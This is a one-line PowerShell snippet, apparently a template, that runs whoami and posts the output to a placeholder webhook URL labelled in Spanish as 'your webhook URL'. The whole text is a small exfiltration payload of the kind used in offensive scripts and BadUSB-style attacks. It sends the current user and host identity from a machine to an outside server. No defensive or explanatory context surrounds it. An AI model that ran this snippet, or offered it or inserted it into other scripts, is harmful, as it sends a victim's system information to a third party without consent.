$info = whoami; Invoke-RestMethod -Uri "TU_URL_DE_WEBHOOK" -Method Post -Body $info
